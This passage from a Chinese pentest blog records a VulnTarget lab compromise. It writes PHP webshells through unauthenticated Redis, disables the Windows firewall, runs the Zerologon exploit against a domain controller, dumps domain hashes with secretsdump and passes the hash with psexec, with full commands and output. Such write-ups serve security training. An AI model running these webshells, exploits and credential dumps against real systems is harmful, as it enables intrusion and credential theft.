+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/vulntarget/a]</span><br><span class="line">└─$ proxychains nmap --min-rate=10000 -p- 10.0.20.99 -Pn</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 14:08 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.20.99</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  redis</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 33.04 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<p>扫描一下网站的目录</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/vulntarget/a]</span><br><span class="line">└─$ proxychains gobuster <span class="built_in">dir</span> -u http://10.0.20.99/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,txt,zip,bak</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.0.20.99/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,zip,bak</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 11]</span><br><span class="line">/Index.php            (Status: 200) [Size: 11]</span><br><span class="line">/l.php                (Status: 200) [Size: 14722]</span><br><span class="line">/L.php                (Status: 200) [Size: 14722]</span><br></pre></td></tr></tbody></table></figure>
+
+<p>访问l.php，发现是一个php探针，得到网站的绝对路径是<code>C:/phpStudy/PHPTutorial/WWW</code></p>
+<h2 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h2><p>并且发现redis是未授权的</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/vulntarget/a]</span><br><span class="line">└─$ proxychains redis-cli -h 10.0.20.99</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  10.0.20.99:6379  ...  OK</span><br><span class="line">10.0.20.99:6379&gt; </span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么写入一个webshell</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> <span class="string">"C:/phpStudy/PHPTutorial/WWW"</span></span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; <span class="built_in">set</span> <span class="built_in">test</span> <span class="string">"&lt;?php system(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span></span><br><span class="line">OK</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现又是系统权限</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/vulntarget/a]</span><br><span class="line">└─$ proxychains curl <span class="string">'http://10.0.20.99/shell.php?cmd=whoami'</span> --output res</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  10.0.20.99:80  ...  OK</span><br><span class="line">100   108  100   108    0     0   2336      0 --:--:-- --:--:-- --:--:--  2347</span><br><span class="line">                                                                                                     </span><br><span class="line">┌──(mikannse㉿kali)-[~/vulntarget/a]</span><br><span class="line">└─$ <span class="built_in">cat</span> res </span><br><span class="line">REDIS0007�      redis-ver3.2.100�</span><br><span class="line">redis-bits�@�ctime��=gused-mem���testnt authority\system</span><br><span class="line">��㋅����</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="双层内网上线"><a href="#双层内网上线" class="headerlink" title="双层内网上线"></a>双层内网上线</h2><p>用蚁剑连接,记得设置代理</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> <span class="string">"C:/phpStudy/PHPTutorial/www/"</span></span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config <span class="built_in">set</span> dbfilename shell1.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; <span class="built_in">set</span> x <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>[0]);?&gt;"</span></span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></tbody></table></figure>
+
+<p>蚁剑连接上线，但这里因为两层内网，不方便直接上线,这里试试看用CS</p>
+<p>开启客户端和服务端之后，先将第一台上线，然后右键可以利用第一台作为跳板机进行转发上线</p>
+<p>先关闭一下windows的防火墙，两台都要</p>
+<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后蚁剑上传,触发后成功上线,ipconfig一下发现还有一张10.0.10.111的网卡</p>
+<p>上传fscan扫描,发现一台.110</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[11/20 20:57:16] [*] Tasked beacon to run: fscan64.exe -h 10.0.10.0/24</span><br><span class="line">[11/20 20:57:16] [+] host called home, sent: 58 bytes</span><br><span class="line">[11/20 20:57:26] [+] received output:</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| '__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.0.10.111     is alive</span><br><span class="line">(icmp) Target 10.0.10.110     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.0.10.111:80 open</span><br><span class="line">10.0.10.111:6379 open</span><br><span class="line">10.0.10.111:445 open</span><br><span class="line">10.0.10.111:139 open</span><br><span class="line">10.0.10.110:135 open</span><br><span class="line">10.0.10.111:135 open</span><br><span class="line">10.0.10.110:88 open</span><br><span class="line">10.0.10.110:445 open</span><br><span class="line">10.0.10.110:139 open</span><br><span class="line">[*] alive ports len is: 9</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetBios: 10.0.10.110     [+]DC VULNTARGET\WIN2019       </span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.111</span><br><span class="line">   [-&gt;]win2016</span><br><span class="line">   [-&gt;]10.0.20.99</span><br><span class="line">   [-&gt;]10.0.10.111</span><br><span class="line">[*] WebTitle: http://10.0.10.111        code:200 len:11     title:None</span><br><span class="line">[+] Redis:10.0.10.111:6379 unauthorized file:C:\Program Files\Redis/dump.rdb</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.110</span><br><span class="line">   [-&gt;]win2019</span><br><span class="line">   [-&gt;]10.0.10.110</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现开启了88端口，那么是一台DC</p>
+<h1 id="Zerologon"><a href="#Zerologon" class="headerlink" title="Zerologon"></a>Zerologon</h1><p>尝试zerologon的利用,利用: <a target="_blank" rel="noopener" href="https://github.com/mstxq17/cve-2020-1472">https://github.com/mstxq17/cve-2020-1472</a></p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/domain]</span><br><span class="line">└─$ proxychains python zerologon.py WIN2019 10.0.10.110</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">=[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line"></span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line">Result: 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br></pre></td></tr></tbody></table></figure>
+
+<p>直接dump数据库</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/domain]</span><br><span class="line">└─$ proxychains secretsdump.py -just-dc -no-pass WIN2019\<span class="variable">$@10</span>.0.10.110</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::</span><br><span class="line">vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:0a5961f001aed3ef2370c4c6d6eb70e1:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1</span><br><span class="line">Administrator:des-cbc-md5:dcc29476a789ec9e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded</span><br><span class="line">krbtgt:des-cbc-md5:10efae67c7026dbf</span><br><span class="line">vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61</span><br><span class="line">vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855</span><br><span class="line">vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58</span><br><span class="line">WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390</span><br><span class="line">WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25</span><br><span class="line">WIN2019$:des-cbc-md5:01c8894f541023bc</span><br><span class="line">WIN2016$:aes256-cts-hmac-sha1-96:eed6593fd08413533507715bcbcaee6b29da1bb281c114168ef92bada53c1b10</span><br><span class="line">WIN2016$:aes128-cts-hmac-sha1-96:99ea46f36ffdc46f7abfb2c1e742d2c6</span><br><span class="line">WIN2016$:des-cbc-md5:94cbc4dcce8f348c</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>哈希传递,拿下管理员权限</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/domain]</span><br><span class="line">└─$ proxychains psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[*] Requesting shares on 10.0.10.110.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file OfQCvEnM.exe</span><br><span class="line">[*] Opening SVCManager on 10.0.10.110.....</span><br><span class="line">[*] Creating service gIAt on 10.0.10.110.....</span><br><span class="line">[*] Starting service gIAt.....</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">[proxychains] Dynamic chain  ...  127.0.0.1:1090  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html<span class="comment">#standard-encodings</span></span><br><span class="line">and <span class="keyword">then</span> execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line">Microsoft Windows [�汾 10.0.17763.107]</span><br><span class="line"></span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html<span class="comment">#standard-encodings</span></span><br><span class="line">and <span class="keyword">then</span> execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line">(c) 2018 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; <span class="built_in">whoami</span>    </span><br><span class="line">nt authority\system</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>打的第一台vulntarget，还是花了不少时间的,多层内网的环境。还是CS好用</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/11/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%94)%E4%B9%8BVulnTargetA/">http://mikannse.space/2024/11/20/打靶记录(一六五)之VulnTargetA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/windows/">windows</a><a class="post-meta__tags" href="/tags/Domain/">Domain</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/15/THMWindowsEventLogs/" title="THMWindowsEventLogs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THMWindowsEventLogs</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/07/19/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%B9%9D)%E4%B9%8BHMVDC02/" title="打靶记录(一一九)之HMVDC02"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-19</div><div class="title">打靶记录(一一九)之HMVDC02</div></div></a></div><div><a href="/2024/07/14/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E5%85%AB)%E4%B9%8BHMVDC01/" title="打靶记录(一一八)之HMVDC01"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-14</div><div class="title">打靶记录(一一八)之HMVDC01</div></div></a></div><div><a href="/2024/09/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E5%85%AD)%E4%B9%8BHTBActive/" title="打靶记录(一二六)之HTBActive"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">打靶记录(一二六)之HTBActive</div></div></a></div><div><a href="/2024/09/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%94%E4%B8%80)%E4%B9%8BHTBFlight/" title="打靶记录(一五一)之HTBFlight"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-20</div><div class="title">打靶记录(一五一)之HTBFlight</div></div></a></div><div><a href="/2024/09/21/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%94%E4%BA%8C)%E4%B9%8BHTBWSizzle/" title="打靶记录(一五二)之HTBWSizzle"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-21</div><div class="title">打靶记录(一五二)之HTBWSizzle</div></div></a></div><div><a href="/2024/09/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%94%E9%9B%B6)%E4%B9%8BHTBBlackfield/" title="打靶记录(一五零)之HTBBlackfield"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-20</div><div class="title">打靶记录(一五零)之HTBBlackfield</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">304</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MS17-010"><span class="toc-number">2.3.</span> <span class="toc-text">MS17_010</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">redis未授权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%B1%82%E5%86%85%E7%BD%91%E4%B8%8A%E7%BA%BF"><span class="toc-number">3.2.</span> <span class="toc-text">双层内网上线</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Zerologon"><span class="toc-number">4.</span> <span class="toc-text">Zerologon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">5.</span> <span class="toc-text">碎碎念</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%94)%E4%B9%8BVulnTargetA/" title="打靶记录(一六五)之VulnTargetA">打靶记录(一六五)之VulnTargetA</a><time datetime="2024-11-20T15:31:29.000Z" title="发表于 2024-11-20 23:31:29">2024-11-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/15/THMWindowsEventLogs/" title="THMWindowsEventLogs">THMWindowsEventLogs</a><time datetime="2024-11-14T16:20:53.000Z" title="发表于 2024-11-15 00:20:53">2024-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/14/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%AC%E5%9B%9B%E7%AB%A0/" title="玄机应急响应第四章">玄机应急响应第四章</a><time datetime="2024-11-14T12:39:37.000Z" title="发表于 2024-11-14 20:39:37">2024-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/14/THMIntrotoEndpointSecurity/" title="THMIntrotoEndpointSecurity">THMIntrotoEndpointSecurity</a><time datetime="2024-11-14T09:08:33.000Z" title="发表于 2024-11-14 17:08:33">2024-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/13/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%B8%80,%E4%BA%8C%E7%AB%A0%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80%E5%92%8C%E5%B8%B8%E7%94%A8%E5%BA%93/" title="Python3爬虫开发笔记第一,二章爬虫基础和常用库">Python3爬虫开发笔记第一,二章爬虫基础和常用库</a><time datetime="2024-11-13T13:46:32.000Z" title="发表于 2024-11-13 21:46:32">2024-11-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i 